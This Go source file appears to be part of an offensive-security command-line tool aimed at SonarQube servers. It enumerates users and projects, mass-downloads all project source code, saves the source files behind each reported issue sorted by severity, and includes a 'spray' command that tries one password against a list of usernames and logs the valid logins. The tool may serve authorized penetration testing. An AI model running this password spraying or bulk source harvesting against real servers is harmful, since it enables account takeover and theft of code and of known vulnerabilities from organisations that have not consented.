package cmd

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/jedib0t/go-pretty/table"
	"github.com/spf13/cobra"

	log "github.com/sirupsen/logrus"
)

var (
	SONARQUBE_SERVER    string
	SONARQUBE_USER      string
	SONARQUBE_PASSWORD  string
	SONARQUBE_TOKEN     string
	SONARQUBE_USER_LIST string
	SONARQUBE_PROJECTS  string
	SONARQUBE_ISSUES    string
	SQ                  Sonar
)

type Sonar struct {
	Client   *http.Client
	User     string
	Password string
	Server   string
}

type TokenValidation struct {
	Valid bool `json:"valid"`
}

type UserSearch struct {
	Page  Paging          `json:"paging"`
	Users []SonarqubeUser `json:"users"`
}

type Paging struct {
	PageIndex int `json:"pageIndex"`
	PageSize  int `json:"pageSize"`
	Total     int `json:"total"`
}

type SonarqubeUser struct {
	Login       string   `json:"login"`
	Name        string   `json:"name"`
	Active      bool     `json:"active"`
	Local       bool     `json:"local"`
	External    string   `json:"externalProvider"`
	Avatar      string   `json:"avatar"`
	ScmAccounts []string `json:"scmAccounts"`
}

type ProjectSearch struct {
	Page       Paging      `json:"paging"`
	Components []Component `json:"components"`
}

type Component struct {
	Organization     string `json:"organization"`
	Key              string `json:"key"`
	Name             string `json:"name"`
	Qualifier        string `json:"qualifier"`
	Visibility       string `json:"visibility"`
	LastAnalysisDate string `json:"lastAnalysisDate"`
	Revision         string `json:"revision"`
	Path             string `json:"path"`
	Language         string `json:"language"`
}

type ComponentTree struct {
	Page          Paging      `json:"paging"`
	BaseComponent Component   `json:"baseComponent"`
	Components    []Component `json:"components"`
}

type IssueSearch struct {
	Page   Paging  `json:"paging"`
	Issues []Issue `json:"issues"`
}

type Issue struct {
	Key          string   `json:"key"`
	Rule         string   `json:"rule"`
	Severity     string   `json:"severity"`
	Component    string   `json:"component"`
	Project      string   `json:"project"`
	Resolution   string   `json:"resolution"`
	Status       string   `json:"status"`
	Message      string   `json:"message"`
	Effort       string   `json:"effort"`
	Debt         string   `json:"debt"`
	Assignee     string   `json:"assignee"`
	Author       string   `json:"author"`
	Tags         []string `json:"tags"`
	CreationDate string   `json:"creationDate"`
	UpdateDate   string   `json:"updateDate"`
	CloseDate    string   `json:"closeDate"`
	Type         string   `json:"type"`
	Organization string   `json:"organization"`
	FromHotspot  bool     `json:"fromHotspot"`
}

func (s *Sonar) Authenticate(server string, user string, password string) error {
	client, err := NewHttpClient()
	if err != nil {
		return err
	}

	endpoint := fmt.Sprintf("%s/api/authentication/validate", server)

	req, err := http.NewRequest("GET", endpoint, nil)
	if err != nil {
		return fmt.Errorf("error in GET request - err: %v", err)
	}

	if len(SONARQUBE_USER) > 0 {
		req.SetBasicAuth(user, password)
	}

	rsp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("error in token validation %v", err)
	}
	defer rsp.Body.Close()

	decoder := json.NewDecoder(rsp.Body)

	token_validation := TokenValidation{}

	err = decoder.Decode(&token_validation)
	if err != nil {
		return fmt.Errorf("error in JSON unmarshal - err: %v", err)
	}

	if !token_validation.Valid {
		return fmt.Errorf("invalid credentials")
	}

	s.Client = client
	s.User = user
	s.Password = password

	return nil
}

func (s *Sonar) AuthenticateByToken(server string, token string) error {
	err := s.Authenticate(server, token, "")
	if err != nil {
		return err
	}

	return nil
}

func (s *Sonar) ListUsers() error {
	log.Println("[Sonarqube] Listing users")

	endpoint := fmt.Sprintf("%s/api/users/search", s.Server)

	req, err := http.NewRequest("GET", endpoint, nil)
	if err != nil {
		return fmt.Errorf("error in GET request - err: %v", err)
	}

	if len(SONARQUBE_USER) > 0 {
		req.SetBasicAuth(s.User, s.Password)
	}

	page := 1
	page_size := 50

	header := table.Row{"LOGIN", "NAME", "ACTIVE", "LOCAL", "EXTERNAL"}
	results := []table.Row{}

	for {
		params := url.Values{
			"p":  {fmt.Sprint(page)},
			"ps": {fmt.Sprint(page_size)},
		}

		req.URL.RawQuery = params.Encode()

		rsp, err := s.Client.Do(req)
		if err != nil {
			return fmt.Errorf("error in list users - err: %v", err)
		}
		defer rsp.Body.Close()

		decoder := json.NewDecoder(rsp.Body)
		search := UserSearch{}

		err = decoder.Decode(&search)
		if err != nil {
			return fmt.Errorf("error in JSON unmarshal - err: %v", err)
		}

		for _, user := range search.Users {
			results = append(results, table.Row{
				user.Login,
				user.Name,
				user.Active,
				user.Local,
				user.External,
			})
		}

		page++
		if len(search.Users) < page_size {
			break
		}
	}

	CreateTable(header, results)

	return nil
}

func (s *Sonar) ListProjects() error {
	log.Println("[Sonarqube] Listing projects")

	header := table.Row{"NAME", "KEY", "VISIBILITY", "ORGANIZATION", "QUALIFIER"}
	results := []table.Row{}

	components, err := s.GetProjectsList()
	if err != nil {
		return err
	}

	for _, component := range components {
		results = append(results, table.Row{
			component.Name,
			component.Key,
			component.Visibility,
			component.Organization,
			component.Qualifier,
		})
	}

	CreateTable(header, results)

	return nil
}

func (s *Sonar) GetProjectsList() ([]Component, error) {
	projects := []Component{}

	endpoint := fmt.Sprintf("%s/api/projects/search", s.Server)

	req, err := http.NewRequest("GET", endpoint, nil)
	if err != nil {
		return projects, fmt.Errorf("error in GET request - err: %v", err)
	}

	if len(SONARQUBE_USER) > 0 {
		req.SetBasicAuth(s.User, s.Password)
	}

	page := 1
	page_size := 50
	qualifiers := "TRK"

	for {
		params := url.Values{
			"p":          {fmt.Sprint(page)},
			"ps":         {fmt.Sprint(page_size)},
			"qualifiers": {qualifiers},
		}

		req.URL.RawQuery = params.Encode()

		rsp, err := s.Client.Do(req)
		if err != nil {
			return projects, fmt.Errorf("error in list projects - err: %v", err)
		}
		defer rsp.Body.Close()

		decoder := json.NewDecoder(rsp.Body)
		search := ProjectSearch{}

		err = decoder.Decode(&search)
		if err != nil {
			return projects, fmt.Errorf("error in JSON unmarshal - err: %v", err)
		}

		projects = append(projects, search.Components...)

		page++
		if len(search.Components) < page_size {
			break
		}
	}

	return projects, nil
}

func (s *Sonar) ListProjectFiles(project_key string) ([]Component, error) {
	files := []Component{}

	endpoint := fmt.Sprintf("%s/api/components/tree", s.Server)

	req, err := http.NewRequest("GET", endpoint, nil)
	if err != nil {
		return files, fmt.Errorf("error in GET request - err: %v", err)
	}

	if len(SONARQUBE_USER) > 0 {
		req.SetBasicAuth(s.User, s.Password)
	}

	page := 1
	page_size := 50
	qualifiers := "FIL"

	for {
		params := url.Values{
			"p":          {fmt.Sprint(page)},
			"ps":         {fmt.Sprint(page_size)},
			"qualifiers": {qualifiers},
			"component":  {project_key},
		}

		req.URL.RawQuery = params.Encode()

		rsp, err := s.Client.Do(req)
		if err != nil {
			return files, fmt.Errorf("error in list projects - err: %v", err)
		}
		defer rsp.Body.Close()

		decoder := json.NewDecoder(rsp.Body)
		tree := ComponentTree{}

		err = decoder.Decode(&tree)
		if err != nil {
			return files, fmt.Errorf("error in JSON unmarshal - err: %v", err)
		}

		files = append(files, tree.Components...)

		page++
		if len(tree.Components) < page_size {
			break
		}
	}

	return files, nil
}

func (s *Sonar) GetFileSource(file_key string) ([]byte, error) {
	endpoint := fmt.Sprintf("%s/api/sources/raw", s.Server)

	req, err := http.NewRequest("GET", endpoint, nil)
	if err != nil {
		return nil, fmt.Errorf("error in GET request - err: %v", err)
	}

	if len(SONARQUBE_USER) > 0 {
		req.SetBasicAuth(s.User, s.Password)
	}

	params := url.Values{
		"key": {file_key},
	}

	req.URL.RawQuery = params.Encode()

	rsp, err := s.Client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("error in GetFileSource - err: %v", err)
	}
	defer rsp.Body.Close()

	data, err := ioutil.ReadAll(rsp.Body)
	if err != nil {
		return nil, fmt.Errorf("error in ReadAll - err: %v", err)
	}

	return data, nil
}

func (s *Sonar) DownloadProjectWorker(projects chan Component, wg *sync.WaitGroup) {
	defer wg.Done()

	for project := range projects {
		os.MkdirAll(
			fmt.Sprintf("%s/%s", SONARQUBE_PROJECTS, project.Name),
			os.ModePerm,
		)

		files, err := s.ListProjectFiles(project.Key)
		if err != nil {
			log.Error(err)
			continue
		}

		for _, f := range files {
			source, err := s.GetFileSource(f.Key)
			if err != nil {
				log.Error(err)
				continue
			}

			path := ""
			if strings.Contains(f.Path, "/") {
				index := strings.LastIndex(f.Path, "/")
				path = fmt.Sprintf("%s/%s/%s", SONARQUBE_PROJECTS, project.Name, f.Path[0:index])
				os.MkdirAll(path, os.ModePerm)
			}

			err = ioutil.WriteFile(
				fmt.Sprintf("%s/%s/%s", SONARQUBE_PROJECTS, project.Name, f.Path),
				source,
				0644,
			)
			if err != nil {
				log.Error("error writing file - err: %v", err)
			}
		}

		log.Printf("Project: %s - Download finished!", project.Name)
	}
}

func (s *Sonar) DownloadAllProjects() {
	log.Println("[Sonarqube] Downloading projects")

	workers := 10

	var wg sync.WaitGroup
	wg.Add(workers)

	projects := make(chan Component)

	for i := 0; i < workers; i++ {
		go s.DownloadProjectWorker(projects, &wg)
	}

	components, err := s.GetProjectsList()
	if err != nil {
		log.Fatal(err)
	}

	for _, component := range components {
		projects <- component
	}

	close(projects)

	wg.Wait()
}

func (s *Sonar) ListIssues() error {
	log.Println("[Sonarqube] Listing issues")

	severities := []string{"BLOCKER", "CRITICAL", "MAJOR", "MINOR", "INFO"}
	for _, severity := range severities {
		os.MkdirAll(
			fmt.Sprintf("%s/%s/", SONARQUBE_ISSUES, severity),
			os.ModePerm,
		)
	}

	endpoint := fmt.Sprintf("%s/api/issues/search", s.Server)

	req, err := http.NewRequest("GET", endpoint, nil)
	if err != nil {
		return fmt.Errorf("error in GET request - err: %v", err)
	}

	if len(SONARQUBE_USER) > 0 {
		req.SetBasicAuth(s.User, s.Password)
	}

	page := 1
	page_size := 50

	for {
		params := url.Values{
			"p":  {fmt.Sprint(page)},
			"ps": {fmt.Sprint(page_size)},
		}

		req.URL.RawQuery = params.Encode()

		rsp, err := s.Client.Do(req)
		if err != nil {
			return fmt.Errorf("error in issues search - err: %v", err)
		}
		defer rsp.Body.Close()

		decoder := json.NewDecoder(rsp.Body)

		search := IssueSearch{}

		err = decoder.Decode(&search)
		if err != nil {
			return fmt.Errorf("error in JSON unmarshal - err: %v", err)
		}

		for _, issue := range search.Issues {
			log.Printf("Issue Found - Project: %s - Key: %s - Severity: %s - Component: %s \n", issue.Project, issue.Key, issue.Severity, issue.Component)

			data, err := s.GetFileSource(issue.Component)
			if err != nil {
				log.Error(err)
				continue
			}

			ioutil.WriteFile(
				fmt.Sprintf("%s/%s/%s.txt", SONARQUBE_ISSUES, issue.Severity, issue.Key),
				data,
				0644,
			)
		}

		page++
		if len(search.Issues) < page_size {
			break
		}
	}

	return nil
}

func NewSonarClient(cmd *cobra.Command, args []string) {
	sonar := Sonar{
		Server: SONARQUBE_SERVER,
	}

	if len(SONARQUBE_TOKEN) > 1 {
		err := sonar.AuthenticateByToken(SONARQUBE_SERVER, SONARQUBE_TOKEN)
		if err != nil {
			log.Fatal(err)
		}
	} else {
		err := sonar.Authenticate(SONARQUBE_SERVER, SONARQUBE_USER, SONARQUBE_PASSWORD)
		if err != nil {
			log.Fatal(err)
		}
	}

	SQ = sonar
}

var sonarqubeCmd = &cobra.Command{
	Use:   "sonarqube",
	Short: "Interact with Sonarqube API",
	Long:  `Interact with Sonarqube API`,

	Run: func(cmd *cobra.Command, args []string) {
		if len(args) == 0 {
			cmd.Help()
			log.Error("the following arguments are required: command")
		}
	},
}

var sonarListUsersCmd = &cobra.Command{
	Use:    "list-users",
	Short:  "List Sonarqube Users",
	Long:   `List Sonarqube Users`,
	PreRun: NewSonarClient,

	Run: func(cmd *cobra.Command, args []string) {
		log.Println("[Sonarqube] Listing users")

		endpoint := fmt.Sprintf("%s/api/users/search", SQ.Server)

		req, err := http.NewRequest("GET", endpoint, nil)
		if err != nil {
			log.Fatalf("error in GET request - err: %v", err)
		}

		if len(SONARQUBE_USER) > 0 {
			req.SetBasicAuth(SQ.User, SQ.Password)
		}

		page := 1
		page_size := 50

		header := table.Row{"LOGIN", "NAME", "ACTIVE", "LOCAL", "EXTERNAL"}
		results := []table.Row{}

		for {
			params := url.Values{
				"p":  {fmt.Sprint(page)},
				"ps": {fmt.Sprint(page_size)},
			}

			req.URL.RawQuery = params.Encode()

			rsp, err := SQ.Client.Do(req)
			if err != nil {
				log.Fatalf("error in list users - err: %v", err)
			}
			defer rsp.Body.Close()

			decoder := json.NewDecoder(rsp.Body)
			search := UserSearch{}

			err = decoder.Decode(&search)
			if err != nil {
				log.Fatalf("error in JSON unmarshal - err: %v", err)
			}

			for _, user := range search.Users {
				results = append(results, table.Row{
					user.Login,
					user.Name,
					user.Active,
					user.Local,
					user.External,
				})
			}

			page++
			if len(search.Users) < page_size {
				break
			}
		}

		CreateTable(header, results)
	},
}

var sonarListProjectsCmd = &cobra.Command{
	Use:    "list-projects",
	Short:  "List Sonarqube Projects",
	Long:   `List Sonarqube Projects`,
	PreRun: NewSonarClient,

	Run: func(cmd *cobra.Command, args []string) {
		log.Println("[Sonarqube] Listing projects")

		header := table.Row{"NAME", "KEY", "VISIBILITY", "ORGANIZATION", "QUALIFIER"}
		results := []table.Row{}

		components, err := SQ.GetProjectsList()
		if err != nil {
			log.Fatal(err)
		}

		for _, component := range components {
			results = append(results, table.Row{
				component.Name,
				component.Key,
				component.Visibility,
				component.Organization,
				component.Qualifier,
			})
		}

		CreateTable(header, results)
	},
}

var sonarDownloadProjectsCmd = &cobra.Command{
	Use:    "download-projects",
	Short:  "Download Sonarqube Projects",
	Long:   `Download Sonarqube Projects`,
	PreRun: NewSonarClient,

	Run: func(cmd *cobra.Command, args []string) {
		log.Println("[Sonarqube] Downloading projects")

		workers := 10

		var wg sync.WaitGroup
		wg.Add(workers)

		projects := make(chan Component)

		for i := 0; i < workers; i++ {
			go SQ.DownloadProjectWorker(projects, &wg)
		}

		components, err := SQ.GetProjectsList()
		if err != nil {
			log.Fatal(err)
		}

		for _, component := range components {
			projects <- component
		}

		close(projects)

		wg.Wait()
	},
}

var sonarListIssuesCmd = &cobra.Command{
	Use:    "list-issues",
	Short:  "List Sonarqube Issues",
	Long:   `List Sonarqube Issues`,
	PreRun: NewSonarClient,

	Run: func(cmd *cobra.Command, args []string) {
		log.Println("[Sonarqube] Listing issues")

		severities := []string{"BLOCKER", "CRITICAL", "MAJOR", "MINOR", "INFO"}
		for _, severity := range severities {
			os.MkdirAll(
				fmt.Sprintf("%s/%s/", SONARQUBE_ISSUES, severity),
				os.ModePerm,
			)
		}

		endpoint := fmt.Sprintf("%s/api/issues/search", SQ.Server)

		req, err := http.NewRequest("GET", endpoint, nil)
		if err != nil {
			log.Fatalf("error in GET request - err: %v", err)
		}

		if len(SONARQUBE_USER) > 0 {
			req.SetBasicAuth(SQ.User, SQ.Password)
		}

		page := 1
		page_size := 50

		for {
			params := url.Values{
				"p":  {fmt.Sprint(page)},
				"ps": {fmt.Sprint(page_size)},
			}

			req.URL.RawQuery = params.Encode()

			rsp, err := SQ.Client.Do(req)
			if err != nil {
				log.Fatalf("error in issues search - err: %v", err)
			}
			defer rsp.Body.Close()

			decoder := json.NewDecoder(rsp.Body)

			search := IssueSearch{}

			err = decoder.Decode(&search)
			if err != nil {
				log.Fatalf("error in JSON unmarshal - err: %v", err)
			}

			for _, issue := range search.Issues {
				log.Printf("Issue Found - Project: %s - Key: %s - Severity: %s - Component: %s \n", issue.Project, issue.Key, issue.Severity, issue.Component)

				data, err := SQ.GetFileSource(issue.Component)
				if err != nil {
					log.Error(err)
					continue
				}

				ioutil.WriteFile(
					fmt.Sprintf("%s/%s/%s.txt", SONARQUBE_ISSUES, issue.Severity, issue.Key),
					data,
					0644,
				)
			}

			page++
			if len(search.Issues) < page_size {
				break
			}
		}
	},
}

var sonarqubeSprayCmd = &cobra.Command{
	Use:   "spray",
	Short: "Sonarqube Password Spray",
	Long:  `Sonarqube Password Spray`,

	Run: func(cmd *cobra.Command, args []string) {
		log.Println("[Sonarqube] Starting password spray")

		sonar := Sonar{
			Server: SONARQUBE_SERVER,
		}

		users, err := os.Open(SONARQUBE_USER_LIST)
		if err != nil {
			log.Fatal(err)
		}
		defer users.Close()

		scannerUsr := bufio.NewScanner(users)
		for scannerUsr.Scan() {
			time.Sleep(10 * time.Second)
			SONARQUBE_USER = scannerUsr.Text()
			err := sonar.Authenticate(SONARQUBE_SERVER, SONARQUBE_USER, SONARQUBE_PASSWORD)

			if err != nil {
				log.WithFields(log.Fields{
					"user":     SONARQUBE_USER,
					"password": SONARQUBE_PASSWORD,
					"error":    err,
				}).Error("invalid login")

				continue
			}

			log.WithFields(log.Fields{
				"user":     SONARQUBE_USER,
				"password": SONARQUBE_PASSWORD,
			}).Info("valid login")
		}

		log.Println("[Sonarqube] Password spray finished")
	},
}

func init() {
	rootCmd.AddCommand(sonarqubeCmd)

	sonarqubeCmd.AddCommand(sonarListUsersCmd)
	sonarqubeCmd.AddCommand(sonarListProjectsCmd)
	sonarqubeCmd.AddCommand(sonarDownloadProjectsCmd)
	sonarqubeCmd.AddCommand(sonarListIssuesCmd)
	sonarqubeCmd.AddCommand(sonarqubeSprayCmd)

	sonarqubeCmd.PersistentFlags().StringVarP(&SONARQUBE_SERVER, "server", "s", "", "Server address")
	sonarqubeCmd.PersistentFlags().StringVarP(&SONARQUBE_USER, "user", "u", "", "Username")
	sonarqubeCmd.PersistentFlags().StringVarP(&SONARQUBE_PASSWORD, "password", "p", "", "Password")
	sonarqubeCmd.PersistentFlags().StringVarP(&SONARQUBE_TOKEN, "token", "t", "", "Token")

	sonarqubeSprayCmd.PersistentFlags().StringVarP(&SONARQUBE_USER_LIST, "userlist", "l", "", "User list")

	var err error

	if SONARQUBE_PROJECTS, err = GetConfigParam("sonarqube.projects"); err != nil {
		log.Fatal(err)
	}

	if SONARQUBE_ISSUES, err = GetConfigParam("sonarqube.issues"); err != nil {
		log.Fatal(err)
	}
}
